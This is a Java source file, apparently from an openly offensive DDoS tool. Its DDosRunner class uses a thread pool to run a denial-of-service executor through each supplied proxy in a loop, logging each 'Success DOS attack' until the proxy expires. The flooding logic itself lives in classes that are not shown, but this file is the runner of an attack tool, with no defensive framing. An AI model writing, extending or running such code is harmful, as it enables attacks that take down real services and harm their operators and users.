package org.defix.ddos;

import org.defix.ddos.executor.abstractions.DosExecutor;
import org.defix.proxyDynamicFinder.objects.ProxyBody;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class DDosRunner {
    private static final Logger logger = LoggerFactory.getLogger(DDosRunner.class);
    private static final ThreadPoolExecutor executor = new ThreadPoolExecutor(
            DDosConfiguration.THREAD_COUNT,
            DDosConfiguration.THREAD_COUNT,
            0L, TimeUnit.MILLISECONDS,
            new ArrayBlockingQueue<>(DDosConfiguration.THREAD_CACHED_COUNT)
    );

    public static void RunDos(ProxyBody proxy) {
        executor.execute(() -> {
            try {
                DosExecutor dosExecutor = DDosConfiguration.getDosExecutor(proxy);
                while (dosExecutor.tryExecute()) {
                    logger.info(STR."<\{DosExecutor.class}> Success DOS attack");
                }
                logger.error("Proxy expired");
                Thread.currentThread().interrupt();
            } catch (Exception e) {
                logger.error(STR."Failed to run DOS: \{e.getMessage()}");
                Thread.currentThread().interrupt();
            }
        });
    }
}
